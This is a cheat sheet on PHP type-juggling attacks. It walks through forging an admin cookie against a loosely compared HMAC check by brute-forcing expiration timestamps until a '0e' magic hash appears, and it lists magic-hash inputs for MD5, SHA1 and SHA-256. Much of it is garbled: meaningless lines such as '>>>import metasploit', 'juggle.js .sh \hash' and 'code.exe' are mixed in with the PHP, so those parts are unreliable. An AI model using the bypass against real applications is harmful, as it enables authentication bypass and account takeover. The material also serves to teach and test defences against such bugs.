# Compare Two Variables
<?php
[!] juggle.js .sh \hash
[-] Loose`== or !=`::var===val
[-] Strict'== or !=='::var===val
[-] Type { --juggle --vuln "LOOSE" == or != /strict === or !== "AREA" --attc -ctrl Var this.vul===web.app $true or $false 0auth -debug
[+]php no string...
Saner$ string&number(RFC) -collision .sh \hash 0e -pass
Saner$ type "ERROR" -persist for --int function(RFC)&&**'0==strcmp($_GET['username']::$pwd 0auth 'strcmp' return, "NUL" --spit "WARNING" throw, code.exe
$ type.js --juggle 
var_dump('0010e2'   == '1e3');           # true
var_dump('0xABCdef' == ' 0xABCdef');     # true PHP 5.0 / false PHP 7.0
var_dump('0xABCdef' == '     0xABCdef'); # true PHP 5.0 / false PHP 7.0
var_dump('0x01'     == 1)                # true PHP 5.0 / false PHP 7.0
var_dump('0x1234Ab' == '1193131');
'123'  == 123
'123a' == 123
'abc'  == 0
'' == 0 == false == NULL
'' == 0       # true
0  == false   # true
false == NULL # true
NULL == ''    # true
["NUL"]
var_dump(sha1([])); # NULL
var_dump(md5([]));  # NULL
>>>import --vuln code.exe
function validate_cookie($cookie,$key){
	$hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['$expiration'], $key);
	if($cookie['hmac'] != $hash){ // loose comparison
		return false;
	... 
$cookie var*["USER"]
$key var*s e c r e t ["unknown"]**user if \hash --calcs str 0*and"0" in $cookie['hmac'] -check --pass
"0e768261251903820937390661668547" == "0"
$ctrl >3 element @cookie :: 
- $username - username you are targetting, probably "admin"
- $hmac - the provided hash, "0"
- $expiration - a UNIX timestamp, must be in the future
Increase the expiration timestamp enough times and we will eventually get a Zero-like calculated HMAC.
hash_hmac(admin|1424869663) -> "e716865d1953e310498068ee39922f49"
hash_hmac(admin|1424869664) -> "8c9a492d316efb5e358ceefe3829bde4"
hash_hmac(admin|1424869665) -> "9f7cdbe744fc2dae1202431c7c66334b"
hash_hmac(admin|1424869666) -> "105c0abe89825a14c471d4f0c1cc20ab"
...#magic hash
$ hash_hmac(admin|1835970773) -> "0e174892301580325162390102935332" // "0e174892301580325162390102935332" == "0"
>>>import metasploit
>>>if \hash ["START"] && "0e" or "0..0e" **numbers
f l o a t
| Hash | “Magic” Number / String    | Magic Hash                                    | Found By / Description      |
| ---- | -------------------------- |:---------------------------------------------:| -------------:|
| MD5  | 240610708                  | 0e462097431906509019562988736854              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | QNKCDZO                    | 0e830400451993494058024219903391              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e1137126905               | 0e291659922323405260514745084877              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e215962017                | 0e291242476940776845150308577824              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 129581926211651571912466741651878684928                | 06da5430449f8f6f23dfc1276f722738              | Raw: ?T0D??o#??'or'8.N=? |
| SHA1 | 10932435112                | 0e07766915004133176347055865026311692244      | Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham |
| SHA-224 | 10885164793773          | 0e281250946775200129471613219196999537878926740638594636 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1138075224010833921) |
| SHA-256 | 34250003024812          | 0e46289032038065916139621039085883773413820991920706299695051332 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1148586399207178241) |
| SHA-256 | TyNOQHUS                | 0e66298694359207596086558843543959518835691168370379069085300385 | [@Chick3nman512](https://twitter.com/Chick3nman512/status/1150137800324526083)
<>
$ var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
$ var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
$ var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
$ var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
* [Writing Exploits For Exotic Bug Classes: PHP Type Juggling By Tyler Borland](http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html)
* [Magic Hashes - WhieHatSec](https://www.whitehatsec.com/blog/magic-hashes/)
* [PHP Magic Tricks: Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
?>
